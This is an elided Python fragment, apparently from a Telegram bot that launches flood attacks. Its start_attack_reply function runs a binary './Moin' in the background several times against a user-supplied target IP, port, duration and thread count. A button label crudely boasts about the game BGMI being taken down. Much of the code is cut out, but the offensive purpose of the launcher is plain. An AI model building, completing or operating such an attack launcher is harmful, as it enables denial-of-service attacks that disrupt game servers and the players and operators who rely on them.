...
def initialize_bot(bot, bot_id):
    ...
    def start_attack_reply(message, target, port, time, owner_name):
        ...
        for i in range(num_instances):
            full_command = ['nohup', './Moin', str(target), str(port), str(time), str(threads_per_instance)]
        ...
        markup.add(InlineKeyboardButton("BGMI RUSSIAN KI TARH CHUD GAYA", callback_data="♥️♥️♥️♥️♥️" + str(chat_id)))
